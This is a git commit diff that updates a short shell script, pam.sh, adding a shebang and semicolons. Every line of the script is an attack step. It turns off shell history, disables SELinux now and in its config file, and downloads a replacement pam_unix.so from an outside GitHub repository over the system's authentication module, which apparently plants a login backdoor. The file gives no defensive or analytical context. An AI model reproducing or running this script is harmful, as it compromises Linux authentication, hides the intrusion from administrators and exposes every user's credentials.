123b004d0da4b6a85c502cbb69dd9fe315428a14
Pe1asguss <99085587+Pe1asguss@users.noreply.github.com>
2022-02-05 23:54:49 +0800

    Update pam.sh

--- pam.sh
+++ pam.sh
@@ -1,5 +1,6 @@
-set +o history\
-setenforce 0\
-sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config\
-wget https://github.com/Pe1asguss/tes/blob/main/pam_unix.so -O /usr/lib64/security/pam_unix.so\
-cat /etc/selinux/config\
+#!/bin/sh
+set +o history;
+setenforce 0;
+sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config;
+wget https://github.com/Pe1asguss/tes/blob/main/pam_unix.so -O /usr/lib64/security/pam_unix.so;
+cat /etc/selinux/config;
